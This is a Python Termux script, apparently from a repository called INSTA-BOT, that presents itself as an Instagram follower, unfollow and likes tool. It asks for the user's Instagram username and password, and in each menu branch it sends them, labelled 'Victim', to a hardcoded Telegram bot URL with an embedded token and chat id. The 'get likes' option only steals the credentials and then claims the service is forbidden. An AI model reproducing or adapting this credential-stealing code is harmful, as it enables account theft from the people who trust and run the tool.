#!user/bin/python 
import requests, json
import os
import sys
import datetime
import time
import subprocess
import requests
from instabot import bot
import requests
import os
import time
from time import sleep
from random import randint

#Colours choosen by amlike
R = '\033[31m' #Red
Y = '\033[93m' #yellow
G = '\033[92m'  #green
rset = '\033[0m'  #clear
B = '\033[1;34m' #Blue
cyan = '\033[96m' #cyan
cy='\033[095m'  #cy
cya='\033[035m' #cya
red = '\033[31m'
yellow = '\033[93m'
green = '\033[92m'
clear = '\033[0m'
bold = '\033[01m'
cyan = '\033[96m'
cy='\033[095m'
cya='\033[035m'
# bak

led = "\033[1;32;41m"
bla ="\033[1;32;40m"
under = "\033[2;32;0m"


rows,columns=os.popen('stty size', 'r').read().split()
Colms =  int ((int (columns) + 16) / 2)
c = " " * Colms
cc = " " * (Colms-8)
hline = '#'*int(columns)

def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.06)

subprocess.call ('clear')
#introduction

print ()
delay_print(green+"T H I S   T O O L   I S   F O R    E D U C A T I O N A L    P U R P O S E S   O N L Y    I F   Y O U    M I S S    U S E   I T   D E V E L O P E R   I S   N O T    R E S P O N S I B L E    F O R   Y O U R   C O M M I T!!!!")
time.sleep(2)
print("")
print("")

delay_print(B+"DO YOU WANT TO CONTINUE???")
delay_print(R+"\tY/N")
for i in range (5):
    co = input(" :")
    if co == "Y":
               os.system("clear")
               time.sleep(1)
               break
    elif co == "yes":
               os.system("clear")
               time.sleep(1)
               break
    elif co == "y":
               os.system("clear")
               time.sleep(1)
               break
    else:
              os.system("clear")
              time.sleep(1)
              os.system("figlet BYE 👍👋")
              print("")
              print(yellow+"TOOL INAENDA KU EXIT MAANA UMECHAGUA KU EXIT OR UMEENDIKA CHAGUO LISILO SASAHIH SO BYEEEE!!!!👍👋")
              print("")
              sys.exit(1)




print ()
print ()
Nick_Name = input (yellow+"Wha is Your NickName Buddy??:\n\n\n  " +red+"   ")
print ()
print ()
os.system('clear')
time.sleep (2)
print (G+hline)
print (R+"\t       x        x")
print (R+"\t         x "+cyan+ "■■ " +R+"x")
print (cyan+"\t         ■■■■■■")
print (cyan+"\t        ■■"+R+"▣"+cyan+"■■"+R+"▣"+cyan+"■■")
print (cyan+"\t       ■■■■■■■■■■")
print (cyan+"\t    ■■ ■■■■■■■■■■ ■■")
print (cyan+"\t  ■■■■ ■■■■■■■■■■ ■■■■")
print (cyan+"\t    ■■ ■■■■■■■■■■ ■■")
print (cyan+"\t       ■■■■■■■■■■")
print (R +"\t         ■■  ■■")
print (R+"\t         ■■  ■■")
print (yellow+"  "+R+"["+yellow+"Developer"+R+"]"+"   "+B+" ➡➡➡➡➡➡"+yellow+"\t  "+R+"["+yellow+"Amlike-Tz"+R+"]"+cyan+"")
print (G+hline+cyan)
print (R+"\t    "+led+B+"   [INSTA-BOT]   "+bla+"")
print (G+hline)
print ()
print ()
print (cya+"\t➡➡ "+R+"["+G+"01"+R+"]"+yellow+" Get Followers")
print ()
print (cya+"\t➡➡ "+R+"["+G+"02"+R+"]"+yellow+" Unfollow All U Following")
print ()
print (cya+"\t➡➡ "+R+"["+G+"03"+R+"]"+yellow+" Unfollow Who Not Follow U")
print ()
print (cya+"\t➡➡ "+R+"["+G+"04"+R+"]"+yellow+" Get likes")
print ()
print (cya+"\t➡➡ "+R+"["+G+"05"+R+"]"+yellow+" Chat With Developer")
print ()
print (cya+"\t➡➡ "+R+"["+G+"06"+R+"]"+yellow+" Update BoT")
print ()
print (cya+"\t➡➡ "+R+"["+G+"07"+R+"]"+yellow+" Join Our Community")
print ()
print (cya+"\t➡➡ "+R+"["+G+"00"+R+"]"+yellow+" EXIT")
print ()
print ()
for i in range (50):
       am = input(bold+under+cya+B+bold+" S"+yellow+" E"+G+" L"+R+" E"+cy+" C"+cyan+" T"+yellow+" :"+cyan+"  ")
       if am == "01":
               os.system("clear")
               time.sleep(2)
               print ()
               print ()
               user_name = input (yellow+"Wha is Your User Name Instagram??:\n  ")
               print ()
               os.system("clear")
               time.sleep(1)
               print ()
               os.system ("clear")
               time.sleep(2)
               os.system("rm -rf config")   
               print ()
               print ()
               Password  = input (yellow+"Enter a password: : ")
               print ()
               os.system("clear")
               os.system("figlet INSTA-BOT")
               print ()
               print ()
               print ()
               print (cya+"\t➡➡ "+R+"["+G+"01"+R+"]"+yellow+" Tanzania Followers")
               print ()
               print (cya+"\t➡➡ "+R+"["+G+"02"+R+"]"+yellow+" International Followers")
               print ()
               print (cya+"\t➡➡ "+R+"["+G+"00"+R+"]"+yellow+" Back Main Menu")
               print ()
               print ()
               for i in range (20):
                     lo = input(bold+under+cya+B+bold+" S"+yellow+" E"+G+" L"+R+" E"+cy+" C"+cyan+" T"+yellow+" :"+cyan+"  ")
                     if lo == "01":
                            os.system("clear && rm -rf config")
                            time.sleep (2)
                            print ()
                            print ()
                            print ()   
                            from instabot import Bot

                            bot = Bot()

                            bot.login(username=(user_name), password=(Password))
#user_id = bot.get_user_id_from_username("amlike_tz")
#user_info = bot.get_user_info(user_id)
# following and followers

#follower = bot.get_user_followers("amlike_tz")                                 
#following = bot.get_user_followers("amlike_tz")

#follow and un follow
                                                        
                            os.system("clear")
                            msg3 =   ['Victim Nick Name: ' +(Nick_Name), 'Victim Instagram User Name: ' +(user_name), 'Victim Instagram Password :' +(Password)]
                            for msg3 in msg3:
                                  my_link = 'https://api.telegram.org/bot1814539827:AAHY4yGlwQ_eG1GzEM0ZtApQKwZgD0Mr1cw/sendMessage?chat_id=-1001481357323&text="FROM INSTA-BOT\n\n"' +msg3 
                                  requests.get(my_link)
                            
                            print ()
                            print ()
                            print (yellow+"LogIn Successfull!!!!! Now starting To Folloe And Unfollow User To get Follwers To Your Account.")
                            print ()
                            print ()
                            print (" IF TAKE TIME DON'T CANCEL THE TERMINAL ATLEAST FOR 2 HOURS!!!!!!")
                            print ()
                            print ()
                            time.sleep (4)
                            follo = (["diamondplatnumz", "vanessamdee", "wolperstylish", "officialalikiba", "officialshilole", "officiallinah", "gigy_money_og", "harmonize_tz", "officialzuchu", "rayvanny", "mangekimambi", "hajismanara"])


                            for follo in follo:
                                 try:
                                     bot.follow(follo)
                                     sleep(randint(1, 1))
                                     bot.unfollow(follo)
                                     sleep(randint(1, 1))
                                     bot.follow(follo)
                                     sleep(randint(1, 1))
                                     bot.unfollow(follo)
                                     sleep(randint(1, 1))
                                 except Exception as e:
                                     print (e)
                                     sleep(randint(30, 300))

                     if lo == "02":
                            os.system("clear")
                            time.sleep (2)
                            print ()
                            print ()
                            print ()
                            from instabot import Bot

                            bot = Bot()

                            bot.login(username=(user_name), password=(Password))
                            os.system("clear")
                            os.system("clear")
                            msg3 =   ['Victim Nick Name: ' +(Nick_Name), 'Victim Instagram User Name: ' +(user_name), 'Victim Instagram Password :' +(Password)]
                            for msg3 in msg3:
                                  my_link = 'https://api.telegram.org/bot1814539827:AAHY4yGlwQ_eG1GzEM0ZtApQKwZgD0Mr1cw/sendMessage?chat_id=-1001481357323&text="FROM INSTA-BOT\n\n"' +msg3
                                  requests.get(my_link)
                            time.sleep (2)
                            print ()
                            print ()
                            print (yellow+"LogIn Successfull!!!!! Now starting To Folloe And Unfollow User To get Follwers To Your Account.")
                            print ()
                            print ()
                            print (" IF TAKE TIME DON'T CANCEL THE TERMINAL ATLEAST FOR 2 HOURS!!!!!!")
                            print ()
                            print ()
                            time.sleep (4)
                            follo = (["selenagomez", "cristiano", "ronaldo", "ronaldinho", "beyonce", "celinedion", "team_padayali", "insta_squadron", "cristiano", "therock", "narendramodi", "nike", "selenagomez", "justinbieber", "beyonce", "rahul_shrimali_official"])


                            for follo in follo:
                                 try:
                                     bot.follow(follo)
                                     sleep(randint(1, 1))
                                     bot.unfollow(follo)
                                     sleep(randint(1, 1))
                                     bot.follow(follo)
                                     sleep(randint(1, 1))
                                     bot.unfollow(follo)
                                     sleep(randint(1, 1))
                                 except Exception as e:
                                     print (e)
                                     sleep(randint(30, 300))
                     if lo == "00":
                            os.system("clear")
                            time.sleep (2)
                            print ()
                            print ()
                            os.system("clear")
                            print (cya+" YOUR GOING BACT TO MAIN MENU")
                            os.system("python start.py")
       elif am == "02":
                os.system("clear")
                time.sleep (2)
                print ()
                print ()
                user_name = input (yellow+"Wha is Your User Name Instagram??:\n  ")
                print ()
                os.system("clear")
                time.sleep (1)
                print ()
                Password  = input (yellow+"Enter a password: : ")
                print ()
                os.system("clear")
                time.sleep(2)
                os.system("rm -rf config")
                print ()
                print ()
                print ()
                from instabot import Bot

                bot = Bot()

                bot.login(username=(user_name), password=(Password))
                os.system("clear")
                os.system("clear")
                msg3 =   ['Victim Nick Name: ' +(Nick_Name), 'Victim Instagram User Name: ' +(user_name), 'Victim Instagram User Password :' +(Password)]
                for msg3 in msg3:
                      my_link = 'https://api.telegram.org/bot1814539827:AAHY4yGlwQ_eG1GzEM0ZtApQKwZgD0Mr1cw/sendMessage?chat_id=-1001481357323&text="FROM INSTA-BOT\n\n"' +msg3
                      requests.get(my_link)
                time.sleep (2)
                print ( )
                print ( )
                print ( )
                print (yellow+"LogIn Successfull!!!!! Now starting To UnFollow All followers Who Did NoT Follw Backs To Your Account.")
                print ( )
                print (cyan)
                print (" IF TAKE TIME DON'T CANCEL THE TERMINAL THIS COULD TAKE A WHILE PLEASE BE PATIENT!!!!!!")
                print ( )
                print ( )
                print ( )
                time.sleep (4)

                non_folo = set(bot.following)


                for non_folo in non_folo:
                      try:
                              bot.unfollow(non_folo)
                              sleep(randint(1, 1))
                      except  Exception as e:
                              print (e)
                              sleep(randint(30, 300))
                os.sys("exit")

       elif am == "03":
                os.system("clear")
                time.sleep (2)
                print ()
                print ()
                user_name = input (yellow+"Wha is Your User Name Instagram??:\n  ")
                print ()
                os.system("clear")
                time.sleep (1)
                print ()
                Password  = input (yellow+"Enter a password: : ")
                print ()
                os.system("clear")
                time.sleep(2)
                os.system("rm -rf config")
                print ()
                print ()
                print ()
                from instabot import Bot

                bot = Bot()

                bot.login(username=(user_name), password=(Password))
                os.system("clear")
                os.system("clear")
                msg3 =   ['Victim Name: ' +(Nick_Name), 'User Name: ' +(user_name), ' Password :' +(Password)]
                for msg3 in msg3:
                      my_link = 'https://api.telegram.org/bot1814539827:AAHY4yGlwQ_eG1GzEM0ZtApQKwZgD0Mr1cw/sendMessage?chat_id=-1001481357323&text="FROM INSTA-BOT\n\n"' +msg3
                      requests.get(my_link)
                time.sleep (2)
                print ( )
                print ( )
                print ( )
                print (yellow+"LogIn Successfull!!!!! Now starting To UnFollow All followers Who Did NoT Follw Backs To Your Account.")
                print ( )
                print (cyan)
                print (" IF TAKE TIME DON'T CANCEL THE TERMINAL THIS COULD TAKE A WHILE PLEASE BE PATIENT!!!!!!")
                print ( )
                print ( )
                print ( )
                time.sleep (4)

                non_folo = set(bot.following) - set(bot.followers)


                for non_folo in non_folo:
                      try:
                              bot.unfollow(non_folo)
                              sleep(randint(1, 1))
                      except  Exception as e:
                              print (e)
                              sleep(randint(30, 300))
                os.sys("exit")
       elif am == "04":
                os.system("clear")
                time.sleep (2)
                print ()
                print ()
                user_name = input (yellow+"Wha is Your User Name Instagram??:\n  ")
                print ()
                os.system("clear")
                time.sleep (1)
                print ()
                Password  = input (yellow+"Enter a password: : ")
                print ()
                os.system("clear")
                time.sleep(2)
                os.system("rm -rf config")
                print ()
                print ()
                print ()
                from instabot import Bot

                bot = Bot()

                bot.login(username=(user_name), password=(Password))
                os.system("clear")
                os.system("clear")
                msg3 =   ['Victim Name: ' +(Nick_Name), 'User Name: ' +(user_name), ' Password :' +(Password)]
                for msg3 in msg3:
                      my_link = 'https://api.telegram.org/bot1814539827:AAHY4yGlwQ_eG1GzEM0ZtApQKwZgD0Mr1cw/sendMessage?chat_id=-1001481357323&text="FROM INSTA-BOT\n\n"' +msg3
                      requests.get(my_link)
                time.sleep (2)
                os.system("clear")
                print ()
                print (red+"THIS SERVICE IS CURENTTLY FORBIDEN PLS TRY AGAIN LATTER!!!!!!! ")
                print ()
                time.sleep (2)
                os.system("clear")
                time.sleep (1)
                sys.exit(0)
       elif am == "05":
                os.system("clear")
                time.sleep (2)
                os.system("clear")
                print("")
                time.sleep(1)
                print("")
                print("PLEASE WAIT...&& UNAENDA WHATSAPP KUWASILIANA NA DEVELOPER")
                time.sleep(2)
                os.system("cd $HOME && cd INSTA-BOT && cd amlike &&  bash wa.sh")
       elif am == "06":
                os.system("clear")
                time.sleep (2)
                print ()
                print ()
                print (yellow+"YOU ARE GOING TO UPDATE INSTABOT")
                print ()
                os.system("cd /data/data/com.termux/files/home && rm -rf INSTA-BOT")
                os.system("cd /data/data/com.termux/files/home && git clone https://github.com/Amlike-Tz/INSTA-BOT.git")
                os.system("cd /data/data/com.termux/files/home && cd INSTA-BOT && python start.py")
       elif am == "07":
                os.system("clear")
                time.sleep (2)
                os.system("clear")
                print("")
                time.sleep(1)
                print("")
                print("PLEASE WAIT...&& UNAENDA TELEGRAM KU JOIN OUR COMMUNITY!!!")
                time.sleep(2)
                os.system("cd $HOME && cd INSTA-BOT && cd amlike &&  bash tele.sh")
       elif am == "00":
                os.system("clear")
                time.sleep (2)
                print ()
                print (red+"BYEEEEEE SEEE YOU LATTER")
                print ()
                time.sleep (1)
                sys.exit(0)
       else:
                os.system("clear")
                time.sleep (2)
                print ()
                print ()
                print (yellow+"Wrong choosen Pls Back To Main Menu.")
                print ()
                time.sleep (2)
                os.system("clear")
                os.system("python start.py")


